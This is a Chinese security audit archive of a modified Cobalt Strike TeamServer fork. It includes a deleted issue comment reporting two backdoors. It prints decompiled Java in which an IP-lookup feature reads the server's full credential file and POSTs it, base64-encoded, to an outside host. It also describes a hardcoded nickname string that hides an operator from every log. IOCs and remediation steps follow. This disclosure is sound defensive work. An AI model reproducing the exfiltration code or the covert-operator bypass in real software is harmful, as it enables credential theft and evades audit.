# CobaltStrike-KunKun 后门审计存档

> 本仓库是 2026-11-10 对 [D13Xian/CobaltStrike-KunKun](https://github.com/D13Xian/CobaltStrike-KunKun)（commit `e32937f`）的后门审计存档。
>
> 原始评论曾发布于该项目的 issue #18（comment id `6762969204`），**已于 2026-11-10T10:43:21Z 被仓库维护者删除**（GitHub issue timeline 中留有 `comment_deleted` 事件）。删除不改变技术结论，故在此公开存档，附带可复现步骤与反编译原件。
>
> - 完整报告：[`CobaltStrike-KunKun-审计报告.md`](./CobaltStrike-KunKun-审计报告.md)
> - 一键复现：[`REPRODUCE.md`](./REPRODUCE.md)
> - 反编译/字节码原件：[`evidence/`](./evidence)
>
> 以下为被删除的评论原文。

---

## 这份二开的 TeamServer 里有后门（两处，可串成完整攻击链）

审计对象：本仓库 `e32937f` 的 `server/cat_server.jar`、`client/cat_client.jar`、`client/cat_client_zh.jar`、仓库内 51 个 CNA 与 173 个二进制。
方法：CFR 0.152 全量反编译（客户端 12,728 + 服务端 12,897 个 class）+ `javap -p -c -v` 字节码核对 + 常量池/资源全量扫描 + 魔法常量稀有度扫描 + 与上游 CrossC2 v3.3 官方包 `diff -rq`/SHA256 比对。纯静态，未向第三方投递任何真实数据。

结论先说：**客户端的插件与二进制是干净的（与上游字节级一致），问题全部在服务端 jar 里。**

---

### 🔴 BD-1 「IP 归属地查询」夹带 TeamServer 全量配置文件

`server/common/LoggedEvent`：

```java
private static String getIPInfoOld() {
    // trust-all TrustManager，并 HttpsURLConnection.setDefaultSSLSocketFactory(...) —— 顺手干掉整个 JVM 的 HTTPS 校验
    URL url = new URL("https://v6r.ipip.net/?format=callback");   // ① 取本机出口公网 IP
    ...
}

private static String getIPInfo(String ip, String process, String user) {
    String propertiesFilePath = "CatServer.properties";
    String sip = LoggedEvent.getIPInfoOld();
    byte[] fileContent = Files.readAllBytes(Paths.get(propertiesFilePath));   // ② ← 多出来的这一行
    String ta = "process: " + process + "\r\n User: " + user + "\r\n" + fileContentStr;
    String tokenAuth = URLEncoder.encode(Base64.getEncoder().encodeToString(ta.getBytes(UTF_8)), "UTF-8");
    HttpRequest.newBuilder()
        .uri(URI.create("http://www.ipip456.com/api.php?ip=" + ip + "&callback=showip&sip=" + sip))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .POST(HttpRequest.BodyPublishers.ofString("location=1&token=" + tokenAuth))     // ③ 密文=配置全文
    return JSONObject.parseObject(resp.body()).getString("region");                    // ④ 只取 region，功能是真做的
}
```

- **触发链唯一**：`Beacons#checkin` → `BeaconInitial(BeaconEntry)`（`server/Beacons.class:125`）→ `getIPInfo`。**任何一台目标首次上线（新 beacon / 新 pid / SSH）就发一次**，无缓存、无节流、无开关。
- **带走的明文**：`CatServer.password`、`CatServer.googlekey`（TOTP 密钥）/`CatServer.safecode`、`CatServer.store-password`、`CatServer.Version`、`CatServer.Iv`、`host/port/profile`，附带"哪个目标 IP、什么进程、什么用户"，以及你的**出口公网 IP**（`sip`）。
- **为什么不容易被发现**：`ipip456.com` 是真实可用的高精度 IP 库，返回 JSON 里有 `region`，客户端"地址"列确实会显示归属地 —— 功能做真，只为掩盖 `token` 字段。异常被 `catch(Exception){return "未知归属地";}` 全吞，断网时表现为"归属地显示未知"，本地零痕迹，也不用起线程。
- **残桩自证**：同一个 jar 里 `bean/CobaltstrikeBean#sendPropertiesFile()` 是个**空方法**，说明"发送配置文件"的逻辑原本独立成方法，后来被搬进了 `LoggedEvent`。
- 字节码侧已核对（`javap -p -c -cp server common.LoggedEvent`，偏移 200 起）：`ldc "CatServer.properties"` → `Files.readAllBytes` → `invokedynamic makeConcatWithConstants` → `Base64$Encoder.encodeToString` → `URLEncoder.encode` → `HttpRequest...POST`，不是反编译器的错觉。

### 🔴 BD-2 硬编码魔法串 `cneiwosbsuwusvwuw` ——「隐身操作员」

全库只出现 5 次，全在服务端，作用全部是**按昵称静音**：

| 位置 | 行为 |
|---|---|
| `ManageUser#process`（`aggressor.ready` 分支） | 昵称含该串 → `aggressor.Join` **不广播**，别人看不到谁进来了 |
| `Resources#broadcast` | 内容含该串 → 整条消息丢弃（上线/下线/用户列表刷新全吞） |
| `Beacons`（`beacons.log_write`） | 该操作员的**命令与回显不进公共 beaconlog** |
| `MudgeSanity#logException` | 其会话线程的异常/报错**静音**，控制台不会出现可疑堆栈 |
| `BeaconC2#dump` | 其在线期间**所有 beacon 的 host called home 提示被全局压制** |

这个串在 README、`CatClient.properties`、`CatServer.properties` 和客户端 jar 里**一处都没有**，正常操作员不可能"碰巧"起这个昵称；也不是配置开关，而是精确字符串匹配 —— 换昵称就恢复正常审计，典型"我知道口令就能隐身"。同一作者手法还有 `MudgeSanity` 把来源 IP 硬编码成 `client (1.1.1.1) read [`，报错日志里永远看不到真实 IP。

**两处合力**：BD-1 拿钥匙 → 作者用普通 CS 客户端、昵称填这串、凭据照抄登录 → BD-2 让这次登录与后续所有操作对其他操作员完全隐形（可静默查看全部 beacon、执行命令、下载文件）。

### 🟠 其他与"功能"无关的削弱
- `getIPInfoOld()` 的 `setDefaultSSLSocketFactory(trust-all)` 是**进程级**副作用：此后 TeamServer 进程内任何 HTTPS 都不校验证书。
- `bean/CobaltstrikeBean#init`：`Security.setProperty("jdk.tls.disabledAlgorithms","")`，重新放开 TLS1.0/1.1、3DES、RC4、MD5 —— 对正常功能没有必要性。
- `ssl/SecureServerSocket#WriteLog`：`authlog=true` 时把失败登录的**明文密码 + 安全码 + IP** 追加写 `./LoginLog.txt`；客户端 `Prefs` 把 teamserver 口令明文写 `~/.demox`。
- 客户端 `aggressor/browsers/TestConnection#trust()` 直接 `return true;`：断线自动重连时**不弹证书指纹校验**并重放明文口令，同端口自签伪 TeamServer 可静默劫持控制台（上游遗留未修）。
- `server/plugins/WeChatPush.cna` 是 `on ready`，**加载即 curl**，把内网 IP/计算机名/用户名发往 `sc.ftqq.com`（Token 目前是占位符，填上就长期外发）。

### ✅ 已排查、未发现问题
- 客户端无第三方回传、无隐藏下载执行、无静默上线、无剪贴板/键盘外发、无内嵌高熵 blob 解密执行；
- 无硬编码第三方 C2、无反射内存马、无异常 `.so`；
- `cat_client.jar` 与 `cat_client_zh.jar` 14,854 个条目仅 7 处不同（主类、MANIFEST、2 个 FlatLaf 配色、`bdetails/bhelp.txt`、`default.cna`），字节码同源，差异不可疑；
- CrossC2Kit 与官方 v3.3 Release `diff -rq` 仅差空 `.git`；LSTAR / CobaltStrike_CNA / antiVirusCheck / AutoPostChain / auto_inject-BOF 零差异，BOF 导入表无网络 API。

### 🧹 给使用者的处置
1. 用这套 jar 跑过的 TeamServer：`password`、`store-password`、`googlekey`、`safecode`、`Iv`、keystore **全部视为已泄露**，立即轮换并重新生成 keystore。
2. 排查出口/代理日志里非浏览器发起的 `www.ipip456.com`、`v6r.ipip.net`；`ss -tnp` 连接数与 UI 在线用户数对不上的要警惕（BD-2 的操作员在 UI 里是隐形的）。
3. 最小补丁：删掉 `getIPInfo/getIPInfoOld` 的网络代码（客户端已有本地 `qqwry/QQWry` 可复用）、删除 5 处 `cneiwosbsuwusvwuw` 判断、回滚两处 TLS 削弱。

IOC：`http://www.ipip456.com/api.php?ip=…&callback=showip&sip=…`（POST `location=1&token=<base64>`）、`https://v6r.ipip.net/?format=callback`、魔法串 `cneiwosbsuwusvwuw`、常量 `client (1.1.1.1) read [`、空方法 `CobaltstrikeBean#sendPropertiesFile`。

---
哪天想把这些“二开”收回去，`git revert` 掉 `LoggedEvent` 里那两行读文件和发 POST 就够了。辛苦。
